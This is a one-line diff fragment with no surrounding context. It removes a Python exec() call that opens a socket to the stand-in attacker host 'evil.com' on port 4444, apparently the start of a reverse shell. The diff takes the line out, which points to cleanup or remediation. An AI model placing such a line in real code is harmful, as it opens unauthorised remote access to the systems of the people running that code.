@@ -1,1 +1,0 @@
-exec("import socket; s=socket.socket(); s.connect(('evil.com', 4444))")
